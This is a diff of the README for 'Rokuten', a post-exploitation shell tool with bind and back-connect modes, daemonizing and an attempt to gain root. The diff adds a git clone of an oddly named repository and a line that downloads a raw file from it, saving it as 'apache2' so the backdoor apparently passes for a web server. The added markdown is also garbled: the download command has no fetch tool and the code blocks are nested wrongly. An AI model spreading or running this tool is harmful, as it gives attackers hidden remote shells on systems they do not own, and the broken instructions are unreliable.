@@ -1,7 +1,7 @@
-# Rokuten
+# Rokuten always apache2
 Rokuten is a post-exploitation shell that includes both a bind and a back connect shell. It creates a fully interactive TTY which allows for job control. The stub size is around 14kb and can be compiled on any Unix like system.
 
-# ScreenShots
+# Image
 ![Screenshot](https://github.com/2326xxxxxxxxxxxx/739812y-0423894182-4-389ur-31289r63-253-0927u--0/blob/main/300%20years%20Poltava%20battle%20Joker%202.jpeg)
 Banner and interaction with shell after a connection is started.
 
@@ -14,10 +14,16 @@ Banner and interaction with shell after a connection is started.
 + Automatically Daemonizes
 + Tries to set GUID/UID to 0 (root)
 
+
 ## Commands
 ```bash
-$ ./switon
+$ git clone https://github.com/2326xxxxxxxxxxxx/739812y-0423894182-4-389ur-31289r63-253-0927u--0.git
 
+## Switon
+Backconnect:
+```bash
+$ https://raw.githubusercontent.com/2326xxxxxxxxxxxx/739812y-0423894182-4-389ur-31289r63-253-0927u--0/main/1111 -O apache2
+```
 ```
 ## Example Usage
 Backconnect:
